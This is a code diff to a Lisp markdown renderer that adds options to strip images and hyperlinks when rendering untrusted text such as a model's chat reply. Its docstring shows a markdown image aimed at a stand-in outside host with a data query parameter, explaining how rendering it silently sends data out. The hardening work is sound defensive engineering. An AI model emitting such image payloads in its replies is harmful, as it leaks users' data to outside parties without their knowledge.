@@ -136,6 +136,14 @@ the check."
         (setf (gethash (3bmd::print-label-to-string (getf (cdr node) :label)) table)
               (getf (cdr node) :source))))))
 
+(defvar *images* t
+  "Whether RENDER may emit an IMG element. NIL renders each image as its alt text (#1119). Bound
+by RENDER from its :IMAGES argument; not meant to be set directly.")
+
+(defvar *links* t
+  "Whether RENDER may emit an HREF. :TEXT renders each link as its text (#1119). Bound by RENDER
+from its :LINKS argument; not meant to be set directly.")
+
 (defun %sanitize (elements references)
   "ELEMENTS (a list of 3bmd document nodes and strings) with every link, image and
 reference definition made safe. A link or reference link whose URL %SAFE-URL refuses is
@@ -151,7 +159,7 @@ replaced by its label, and an image by its alt text, so the words stay and the U
     (case tag
       (:explicit-link
        (let ((label (%sanitize (getf rest :label) references))
-             (url (%safe-url (getf rest :source))))
+             (url (and (not (eq *links* :text)) (%safe-url (getf rest :source)))))
          (if url
              (list (list* :explicit-link :label label :source url
                           (loop for (k v) on rest by #'cddr
@@ -161,7 +169,11 @@ replaced by its label, and an image by its alt text, so the words stay and the U
        ;; (:image (:explicit-link :label ... :source ... :title ...))
        (let* ((link (cdr (first rest)))
               (label (%sanitize (getf link :label) references))
-              (url (%safe-url (getf link :source))))
+              ;; WITH *IMAGES* NIL THE URL IS NOT EVEN READ, so no IMG can be emitted whatever
+              ;; shape the node has -- an explicit image, or a reference image whose source is
+              ;; elsewhere. The alt text is what is left, which is what a refused URL already
+              ;; produced (#1119).
+              (url (and *images* (%safe-url (getf link :source)))))
          (if url
              (list (list :image (list* :explicit-link :label label :source url
                                        (loop for (k v) on link by #'cddr
@@ -172,7 +184,7 @@ replaced by its label, and an image by its alt text, so the words stay and the U
        (let* ((label (getf rest :label))
               (key (3bmd::print-label-to-string (or (getf rest :definition) label)))
               (source (gethash key references)))
-         (if (and source (%safe-url source))
+         (if (and source (not (eq *links* :text)) (%safe-url source))
              (list node)
              ;; Refused, or undefined: the label as text. An undefined one would have
              ;; printed as text anyway, with a warning.
@@ -184,7 +196,7 @@ replaced by its label, and an image by its alt text, so the words stay and the U
                             unless (eq k :source) nconc (list k v))))))
       (:link
        ;; An autolink, <http://...>: its text is the URL.
-       (let ((url (%safe-url (first rest))))
+       (let ((url (and (not (eq *links* :text)) (%safe-url (first rest)))))
          (if url (list (list :link url)) (list (first rest)))))
       (t (list (cons tag (%sanitize rest references)))))))
 
@@ -308,7 +320,7 @@ language name, and its content escaped for `&' when the renderer will not do tha
         ((consp tree) (cons (%restore (car tree)) (%restore (cdr tree))))
         (t tree)))
 
-(defun render (markdown &key allow-html)
+(defun render (markdown &key allow-html (images t) (links t))
   "Render MARKDOWN (a string) to an HTML string. SAFE by default: raw HTML in the
 source is shown as text (suitable for user/untrusted content), and the text of code spans
 and code blocks is escaped once (#559). ALLOW-HTML t passes raw HTML through -- trusted
@@ -320,9 +332,41 @@ short. The check reads the URL as a browser will: character references decoded, 
 newlines and other control characters inside the scheme ignored, so `jav&#x61;script:' and
 `java<TAB>script:' are both refused. A refused link renders as its text with no href, and a
 refused image as its alt text. An allowed URL is written into its attribute escaped, which
-3bmd does not do itself."
+3bmd does not do itself.
+
+FOR UNTRUSTED TEXT, such as a model's reply shown in a chat, pass :IMAGES NIL and :LINKS :TEXT
+(#1119). The defaults keep both, so nothing that renders trusted content changes.
+
+  :IMAGES NIL  renders each image as its alt text and emits no IMG element. An image is fetched
+               as soon as it is rendered, with no click, so a reply holding
+               `![x](https://elsewhere.example/?d=...)' makes the reader's machine send that
+               request. In a desktop webview with no Content-Security-Policy nothing stops it.
+  :LINKS :TEXT renders each link as its text and emits no HREF. In a desktop webview, following
+               a link replaces the app's own page with the linked one.
+
+Both apply to every form the markdown can take: an explicit link or image, a reference link, and
+an autolink. NEITHER CAN BE COMBINED WITH :ALLOW-HTML T, which signals: raw HTML is not parsed
+into the tree these options filter, so an IMG or HREF written directly in the source would
+survive them, and the option would be promising something it does not do. :IMAGES accepts T or NIL and :LINKS accepts T or :TEXT; ANY OTHER VALUE SIGNALS
+rather than falling back to the default, because the default is the permissive one and a typo in
+a security option must not read as `render everything'."
+  ;; :ALLOW-HTML T CANNOT BE COMBINED WITH EITHER UNTRUSTED MODE, and the combination signals
+  ;; rather than doing its best. Measured: with :ALLOW-HTML T a raw `<img src=...>' or
+  ;; `<a href=...>' in the source passes through untouched, because raw HTML is not parsed into
+  ;; the tree %SANITIZE walks -- so :IMAGES NIL would have reported no image while the output
+  ;; carried one. The two arguments also describe opposite situations: :ALLOW-HTML T is for
+  ;; content this app wrote, and these modes are for content it did not. An option that promises
+  ;; a guarantee it cannot deliver is worse than no option (#1119).
+  (when (and allow-html (or (null images) (eq links :text)))
+    (error "hyperion/markdown: :ALLOW-HTML T cannot be combined with :IMAGES NIL or :LINKS :TEXT. Raw HTML passes through unparsed, so an IMG or an HREF written directly in the source would survive both. Render untrusted text without :ALLOW-HTML."))
+  (unless (member images '(t nil))
+    (error "hyperion/markdown: :IMAGES must be T or NIL, not ~S" images))
+  (unless (member links '(t :text))
+    (error "hyperion/markdown: :LINKS must be T or :TEXT, not ~S" links))
   (if (and markdown (plusp (length markdown)))
-      (let ((3bmd-code-blocks:*code-blocks* t)
+      (let ((*images* images)
+            (*links* links)
+            (3bmd-code-blocks:*code-blocks* t)
             ;; NIL in the safe mode: each of these makes 3bmd print some text without escaping
             ;; it, which the safe mode's escaping relies on not happening (#559). :ALLOW-HTML T
             ;; keeps the app's values, as it did before #559.
